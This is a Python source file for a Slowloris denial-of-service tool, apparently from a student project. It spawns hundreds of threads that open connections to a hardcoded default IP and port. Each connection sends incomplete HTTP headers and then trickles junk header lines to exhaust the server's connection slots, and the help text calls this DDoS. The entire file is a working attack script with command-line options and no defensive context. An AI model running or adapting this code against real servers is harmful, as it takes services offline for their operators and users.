# -*- coding: utf-8 -*-
"""
Created on Tue May 15 11:49:33 2018
@author: DrLC
"""

import random
import sys
import threading
import time
#import scapy.all as sca
from socket import *

THREAD_DEFAULT = 300
TARGET_DEFAULT = "47.106.157.25"
PORT_DEFAULT = 8000

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def print_help():
    print()
    print("+--------------------------+")
    print("|                          |")
    print("|      SlowLoris           |")
    print("|                          |")
    print("|       by TakingOffPKU    |")
    print("|                          |")
    print("+--------------------------+")
    print()
    print("DDoS the target server process with toy-like SYN flood.")
    print()
    print("Use the following command to start attacking.")
    print("  python3 %s" % (sys.argv[0]))
    print("Optional arguments are:")
    print("  -H or --host\tIP address of the server.")
    print("  -P or --port\tPort of the server.")
    print("  -T or --thread\tMultithread.")
    print("  -V or --verbose\tVerbose mode")
    print("Example:")
    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD -V IF_VERBOSE"
          % (sys.argv[0]))
    print()


def getopt(ARGS):
    if '-h' in ARGS or '--help' in ARGS:
        try:
            assert False
        except:
            print_help()
            exit(0)
    ret = {"host": TARGET_DEFAULT,
           "port": PORT_DEFAULT,
           "thread": THREAD_DEFAULT,
           "verbose": True}
    for i in range(1, len(ARGS)):
        if i % 2 == 1:
            if ARGS[i] in ['-H', '--host']:
                ret['host'] = str(ARGS[i + 1])
            elif ARGS[i] in ['-P', '--port']:
                ret['port'] = int(ARGS[i + 1])
            elif ARGS[i] in ['-T', '--thread']:
                ret['thread'] = int(ARGS[i + 1])
            elif ARGS[i] in ['-V', '--verbose']:
                if ARGS[i + 1] == 'y':
                    ret['verbose'] = True
                else:
                    ret['verbose'] = False
            else:
                try:
                    assert False
                except:
                    print_help()
                    exit(0)
    return ret


class sendSlow(threading.Thread):
    THREAD = 0

    def __init__(self, target, port, verbose=False):
        try:
            self.__target = target
            self.__port = port
            self.__id = sendSlow.THREAD
            self.__verbose = verbose
            sendSlow.THREAD += 1
            threading.Thread.__init__(self)
        except KeyboardInterrupt:
            if self.__verbose:
                print("\nSlow Loris attack ends!")
            exit(0)

    def __del__(self):
        try:
            sendSlow.THREAD -= 1
        except KeyboardInterrupt:
            if self.__verbose:
                print("\nSlow Loris attack ends!")
            exit(0)

    def run(self):
        while True:
            try:
                s = socket(AF_INET, SOCK_STREAM)
                con = s.connect((self.__target,self.__port))
                break
            except KeyboardInterrupt:
                if self.__verbose:
                    print("\nSYN flood attack ends!")
                exit(0)
            except:
                continue
        try:
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
            s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
            s.send("{}\r\n".format("Cache-Control: no-cache").encode("utf-8"))
            s.send("{}\r\n".format("Cache-Control: no-cache").encode("utf-8"))
            if self.__verbose:
                print("\r%d threads running" % sendSlow.THREAD, end="")
                print("\nsocket build successful!")
        except KeyboardInterrupt:
            if self.__verbose:
                print("\nSYN flood attack ends!")
            exit(0)
        except:
            if self.__verbose:
                print("\nsocket build2 error!")
            return
        while True:
            try:
                if self.__verbose:
                    print("send a pair")
                s.send("H-s: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                time.sleep(10)
            except KeyboardInterrupt:
                if self.__verbose:
                    print("\nSlowLoris flood attack ends!")
                exit(0)
            except:
                return


if __name__ == "__main__":

    args = getopt(sys.argv)
    if args['verbose'] == True:
        print()
        print("+--------------------------+")
        print("|                          |")
        print("|      SlowLoris           |")
        print("|                          |")
        print("|       by TakingOffPKU    |")
        print("|                          |")
        print("+--------------------------+")
        print()
        print("Host: %s" % args["host"])
        print("Port: %d" % args["port"])
        print("Thread: %d" % args["thread"])
        print()
        print("SlowLoris attack will begin in")
    countdown = 5
    for i in range(countdown, 0, -1):
        if args['verbose'] == True:
            string = '\r'
            for j in range(countdown, i - 1, -1):
                string += str(j) + "..."
            print(string, end="")
        time.sleep(1)
    if args['verbose'] == True:
        print("\nSlowLoris attack begins!")

    while True:
        try:
            if sendSlow.THREAD <= args['thread']:
                tmp = sendSlow(args['host'], args['port'], args['verbose'])
                tmp.start()
                #time.sleep(10/args['thread'])
        except KeyboardInterrupt:
            print("\nSlowLoris attack ends!")
            exit(0)
